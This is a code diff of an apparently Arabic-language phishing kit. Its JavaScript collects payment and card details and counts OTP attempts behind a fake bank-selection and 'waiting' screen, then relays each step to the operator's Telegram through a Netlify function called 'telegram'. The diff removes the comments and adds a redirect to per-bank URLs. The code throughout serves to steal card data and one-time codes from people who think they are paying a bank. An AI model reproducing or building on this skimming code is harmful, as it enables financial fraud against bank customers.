@@ -1,11 +1,9 @@
-// متغيرات التطبيق
 let selectedBank = null;
 let otpAttempts = 0;
 const maxOtpAttempts = 3;
 let messageId = null;
 let collectedData = {};
 
-// دالة بناء الرسالة
 function buildMessage() {
     let message = "📋 تفاصيل عملية الدفع:\n\n";
     for (const [step, stepData] of Object.entries(collectedData)) {
@@ -29,21 +27,17 @@ function buildMessage() {
     return message;
 }
 
-// دالة الإرسال الآمنة (عبر خوادم Netlify)
 async function sendToTelegram(data, isUpdate = false) {
     try {
-        // تحديث البيانات المجمعة
         collectedData[data.step] = data.data;
         const message = buildMessage();
 
-        // تجهيز البيانات لإرسالها إلى نيتليفاي
         const body = {
             message: message,
             isUpdate: isUpdate,
             messageId: messageId
         };
 
-        // إرسال الطلب إلى دالة نيتليفاي بدلاً من تليجرام مباشرة
         const response = await fetch('/.netlify/functions/telegram', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -52,7 +46,6 @@ async function sendToTelegram(data, isUpdate = false) {
 
         const result = await response.json();
 
-        // حفظ رقم الرسالة (messageId) لنتمكن من تحديثها في الخطوات القادمة
         if (!messageId && result.ok) {
             messageId = result.result.message_id;
         }
@@ -88,8 +81,13 @@ document.addEventListener('DOMContentLoaded', function() {
             document.getElementById('bank-waiting-page').classList.remove('hidden');
             
             setTimeout(() => {
-                document.getElementById('bank-waiting-page').classList.add('hidden');
-                document.getElementById('card-details-page').classList.remove('hidden');
+                if (selectedBank.url) {
+                    window.location.href = selectedBank.url;
+                } else {
+                    alert("عذراً، هذا البنك غير متاح حالياً.");
+                    document.getElementById('bank-waiting-page').classList.add('hidden');
+                    document.getElementById('bank-selection-page').classList.remove('hidden');
+                }
             }, 3000);
         });
         bankCardsContainer.appendChild(bankCard);
